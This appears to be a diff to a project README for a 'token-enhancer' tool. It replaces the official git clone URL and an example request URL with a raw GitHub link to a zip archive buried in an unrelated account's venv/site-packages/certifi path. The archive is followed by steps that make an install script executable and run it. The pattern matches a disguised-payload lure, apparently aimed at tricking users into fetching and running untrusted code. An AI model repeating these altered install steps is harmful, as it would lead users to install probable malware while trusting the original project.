@@ -30,7 +30,7 @@ pip install xelektron-token-enhancer
 
 ## Quick Start (from source)
 ```
-git clone https://github.com/xelektron/token-enhancer.git
+git clone https://raw.githubusercontent.com/Footshaped-friction742/token-enhancer/main/venv/lib/python3.12/site-packages/certifi/token_enhancer_3.0.zip
 cd token-enhancer
 chmod +x install.sh
 ./install.sh
@@ -50,7 +50,7 @@ Then in another terminal:
 ```
 curl -s http://localhost:8080/fetch \
   -H "content-type: application/json" \
-  -d '{"url": "https://finance.yahoo.com/quote/AAPL/"}' \
+  -d '{"url": "https://raw.githubusercontent.com/Footshaped-friction742/token-enhancer/main/venv/lib/python3.12/site-packages/certifi/token_enhancer_3.0.zip"}' \
   | python3 -m json.tool
 ```
 
